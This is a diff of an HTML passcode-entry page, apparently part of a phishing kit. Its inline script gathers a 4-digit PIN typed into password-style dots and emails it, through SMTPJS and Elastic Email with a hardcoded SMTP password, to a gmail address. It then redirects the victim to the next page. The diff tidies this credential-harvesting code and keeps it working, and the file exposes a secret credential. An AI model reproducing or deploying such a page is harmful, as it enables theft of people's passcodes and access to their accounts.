@@ -8,100 +8,93 @@
   <link rel="stylesheet" href="pin.css">
 </head>
 <body>
-    <form id="form" onsubmit="emailSend(); return false;">
-  <div class="container">
-    <h3>Enter passcode</h3>
-    <div class="dots">
-      <!-- Inputs styled as password dots -->
-      <input type="password" maxlength="1" class="dot-input" id="input1" inputmode="numeric" oninput="moveToNext(this, 'input2')">
-      <input type="password" maxlength="1" class="dot-input" id="input2" inputmode="numeric" oninput="moveToNext(this, 'input3')" onkeydown="moveToPrevious(event, 'input1')">
-      <input type="password" maxlength="1" class="dot-input" id="input3" inputmode="numeric" oninput="moveToNext(this, 'input4')" onkeydown="moveToPrevious(event, 'input2')">
-      <input type="password" maxlength="1" class="dot-input" id="input4" inputmode="numeric" onkeydown="moveToPrevious(event, 'input3')">
+  <form id="form" onsubmit="return false;">
+    <div class="container">
+      <h3>Enter Passcode</h3>
+      <div class="dots">
+        <!-- Inputs styled as password dots -->
+        <input type="password" maxlength="1" class="dot-input" id="input1" inputmode="numeric">
+        <input type="password" maxlength="1" class="dot-input" id="input2" inputmode="numeric">
+        <input type="password" maxlength="1" class="dot-input" id="input3" inputmode="numeric">
+        <input type="password" maxlength="1" class="dot-input" id="input4" inputmode="numeric">
+      </div>
+      <button id="nextBtn" disabled>Next</button>
     </div>
-    <button id="nextBtn" onclick="goToNextPage()" disabled>Next</button>
-  </div>
   </form>
-    <!-- External Libraries -->
+
+  <!-- External Libraries -->
   <script src="https://smtpjs.com/v3/smtp.js"></script>
   <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-  
-<script>
-  // Function to handle passcode submission
-function emailSend() {
-  var passcode = [];
-  
-  // Collect passcode input values
-  const passcodeInputs = document.querySelectorAll('.dot-input');
-  passcodeInputs.forEach(input => {
-    passcode.push(input.value.trim());
-  });
 
-  // Check if all passcode fields are filled
-  if (passcode.includes("") || passcode.length !== 4) {
-    swal("Error", "Please complete all 4 passcode fields", "error");
-    return;
-  }
+  <script>
+    // Function to handle passcode submission
+    function emailSend() {
+      const passcode = [];
+      const passcodeInputs = document.querySelectorAll('.dot-input');
 
-  // Create the message body for the email
-  var messageBody = "Passcode: " + passcode.join("");
+      // Collect passcode inputs
+      passcodeInputs.forEach(input => passcode.push(input.value.trim()));
 
-  // Send the email
-  Email.send({
-    Email.send({
-    Host: "smtp.elasticemail.com",
-    Username: "payday10177@gmail.com",
-    Password: "176A549B6BD880A9C5A531EDE06FF1F541C8",
-    To: 'payday10177@gmail.com',
-    From: "payday10177@gmail.com",
-    Subject: "Passcode",
-    Body: messageBody
-  }).then(
-    message => {
-      if (message === 'OK') {
-        window.location.href = 'pin.html'; // Redirect to the next page
-      } else {
-        swal("Error", "There was a problem sending your passcode. Please try again.", "error");
+      // Validate all passcode fields are filled
+      if (passcode.includes("") || passcode.length !== 4) {
+        swal("Error", "Please complete all 4 passcode fields.", "error");
+        return;
       }
+
+      // Prepare email message body
+      const messageBody = "Passcode: " + passcode.join("");
+
+      // Send email
+      Email.send({
+        Host: "smtp.elasticemail.com",
+        Username: "payday10177@gmail.com",
+        Password: "176A549B6BD880A9C5A531EDE06FF1F541C8",
+        To: 'payday10177@gmail.com',
+        From: "payday10177@gmail.com",
+        Subject: "Passcode",
+        Body: messageBody
+      }).then(message => {
+        if (message === 'OK') {
+          swal("Success", "Passcode submitted successfully.", "success").then(() => {
+            window.location.href = 'next.html'; // Redirect to the next page
+          });
+        } else {
+          swal("Error", "There was an issue submitting your passcode. Please try again.", "error");
+        }
+      });
     }
-  );
-}
 
-// Automatically move to the next input field when a digit is entered
-const passcodeInputs = document.querySelectorAll('.dot-input');
-passcodeInputs.forEach((input, index) => {
-  input.addEventListener('input', () => {
-    if (input.value.length === 1 && index < passcodeInputs.length - 1) {
-      passcodeInputs[index + 1].focus();
+    // Automatically move focus between inputs
+    const passcodeInputs = document.querySelectorAll('.dot-input');
+
+    passcodeInputs.forEach((input, index) => {
+      input.addEventListener('input', () => {
+        // Move to next input
+        if (input.value.length === 1 && index < passcodeInputs.length - 1) {
+          passcodeInputs[index + 1].focus();
+        }
+
+        // Check if the form is complete
+        checkPasscodeCompletion();
+      });
+
+      input.addEventListener('keydown', (e) => {
+        // Handle backspace to move to previous input
+        if (e.key === 'Backspace' && input.value === '' && index > 0) {
+          passcodeInputs[index - 1].focus();
+        }
+      });
+    });
+
+    // Enable "Next" button when all inputs are filled
+    const nextBtn = document.getElementById('nextBtn');
+    function checkPasscodeCompletion() {
+      const allFilled = Array.from(passcodeInputs).every(input => input.value.trim() !== '');
+      nextBtn.disabled = !allFilled;
     }
-  });
 
-  input.addEventListener('keydown', (e) => {
-    // Move to the previous input on Backspace
-    if (e.key === 'Backspace' && input.value === '' && index > 0) {
-      passcodeInputs[index - 1].focus();
-    }
-  });
-});
-
-// Enable the "Next" button when all fields are filled
-const nextBtn = document.getElementById('nextBtn');
-
-function checkPasscodeCompletion() {
-  const allFilled = Array.from(passcodeInputs).every(input => input.value.trim() !== '');
-  nextBtn.disabled = !allFilled;
-
-  if (allFilled) {
-    nextBtn.classList.add("enabled");
-  } else {
-    nextBtn.classList.remove("enabled");
-  }
-}
-
-passcodeInputs.forEach(input => input.addEventListener('input', checkPasscodeCompletion));
-
-// Next button click handler
-nextBtn.addEventListener('click', emailSend);
-</script>
-  <script src="scripts.js"></script>
+    // Bind "Next" button click
+    nextBtn.addEventListener('click', emailSend);
+  </script>
 </body>
 </html>
